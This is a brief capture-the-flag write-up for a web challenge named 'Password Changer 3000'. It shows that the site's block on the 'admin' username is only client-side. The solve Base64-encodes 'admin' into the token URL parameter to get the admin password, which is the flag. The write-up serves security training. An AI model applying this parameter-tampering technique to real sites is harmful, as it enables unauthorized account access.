# Password Changer 3000

| | |
|---|---|
| **Section** | Web Security |
| **Category** | web |
| **Solves** | 1838 |

## Overview

The application provides a password change functionality through a `token` URL parameter:

```
http://password-changer.challs.olicyber.it/change-password.php?token=YQ==
```

The token value is the Base64-encoded username.

The username `admin` is blocked in the input form.

## Solve

The restriction on `admin` is client-side and can be bypassed by directly editing the URL parameter.

```
admin -> YWRtaW4=
```

```
http://password-changer.challs.olicyber.it/change-password.php?token=YWRtaW4=
```

The page returns the password for `admin`, which corresponds to the flag.